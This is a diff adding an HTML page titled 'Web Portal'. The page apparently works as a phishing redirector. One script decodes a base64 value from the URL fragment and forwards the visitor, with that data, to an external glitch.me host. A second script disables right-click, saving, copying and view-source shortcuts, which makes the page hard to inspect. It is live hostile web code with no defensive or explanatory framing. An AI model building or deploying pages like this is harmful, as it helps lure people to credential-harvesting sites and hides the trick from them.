@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script
+      src="https://code.jquery.com/jquery-3.3.1.js"
+      integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
+      crossorigin="anonymous"
+    ></script>
+    <title>Web Portal</title>
+    <link
+      rel="Shortcut Icon"
+      href="data:image/vnd.microsoft.icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAmNJREFUWAntlj1oFFEUhb+dMbsa0Tj+IEJECwtjEBWUaNJoEETQwsbSQosYsFBEUGxilVbLiBFsrLSwsgmCRlKERDcIi0SSwkZUyI8GcZPMjPc6OzCz5unMzgqCe5t5M+/ec86ce2f3QSP+dwdyJgP8PizTXi3Pc314K9XFBIwN0DQ/Qb+V44Ln0rJSQa3PLJs5z+d+yz5uHOxhKcRZFS70quTOBnrbd9OcL0R3sq/LizilEr3zRXxBuxYixmyWNz+/p63+5EpWyINiI+6G5HqNCXBdHE38W1EQV10PJ4ofExDdoOsJdI9A887Y41Q3m7rg5Dtov2UsMwvIi9DNR+D4KChQ2thxDo4+g3W7oMk8z2YBw6fgw1NYvSUAUsBEIR/W3n7oeAC29HPyNkxcNVaaBSx/gZenBeBOAKSACixTZAx7LXQ+hrbr4C3DWA8Ur4DvGkvMArREC4uXBehiAKjASqBE1bGmVWZmGFrPwOIsvDgB03ers365/72AMH16IABUYCVQIiUMwzkUzIpzAL5OwlAHfJL+J4hkAhRIAYcOC4FMtRLpcCrx9rNw7LkI2gYfKzkLkpMwYr+Ef6xZqLxd5yPY2h04Ycmg5WQupsSlV5ekbdL7FJHcgRB0qdLfKemvXRBCD17LnIzLnKQkV8h0DoQilGhcJvz9Qxm4GfkTeRPupL7WJiCk+Sy9zxjpW5CRsLq8IeDfcsC2mC2Xq7tUv3vFVo4oYswB3+de6S3fyt+jKfVZK6Ziy4FsMIoY+wzX7+fmXBFGRn8eSjdGE7Ou5VA6I+fiQeXIitWobzhQVwd+AI9rn2s+gpC6AAAAAElFTkSuQmCC"
+    />
+  </head>
+  <body>
+    <script>
+      function redirrectPage() {
+        var query = window.location.href;
+        console.log(query);
+        var res = query.split("#");
+        var data1 = res[0];
+        var data2 = res[1];
+        console.log(data1);
+        console.log(data2);
+        data2 = atob(data2);
+        if (data2) {
+          console.log("true");
+          window.location.href =
+            "https://xinter-recoffs.glitch.me#" +
+            data2;
+        }
+      }
+      redirrectPage();
+    </script>
+    <script>
+      $(document).bind("keydown", function (e) {
+        if (e.ctrlKey && e.which == 83) {
+          e.preventDefault();
+          return false;
+        }
+      });
+      document.addEventListener("contextmenu", (event) =>
+        event.preventDefault()
+      );
+      document.onkeydown = function (e) {
+        if (
+          e.ctrlKey &&
+          (e.keyCode === 67 ||
+            e.keyCode === 86 ||
+            e.keyCode === 85 ||
+            e.keyCode === 117)
+        ) {
+          return false;
+        } else {
+          return true;
+        }
+      };
+      $(document).keypress("u", function (e) {
+        if (e.ctrlKey) {
+          return false;
+        } else {
+          return true;
+        }
+      });
+    </script>
+  </body>
+</html>
